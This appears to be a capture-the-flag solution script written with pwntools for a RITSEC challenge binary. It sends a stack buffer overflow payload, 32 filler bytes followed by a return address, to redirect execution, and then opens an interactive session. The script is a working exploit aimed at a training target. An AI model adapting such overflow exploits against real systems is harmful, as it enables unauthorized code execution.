#!/usr/bin/env python3

from pwn import *

if args.REMOTE:
    r = remote("ctf.ritsec.club", 31746)
elif args.GDB:
    r = gdb.debug("./test_gumponent", "b *0x4012B0")
else:
    r = process("./test_gumponent")

payload = b"A" * 32 + p64(0x401230)

r.sendline(payload)
r.interactive()
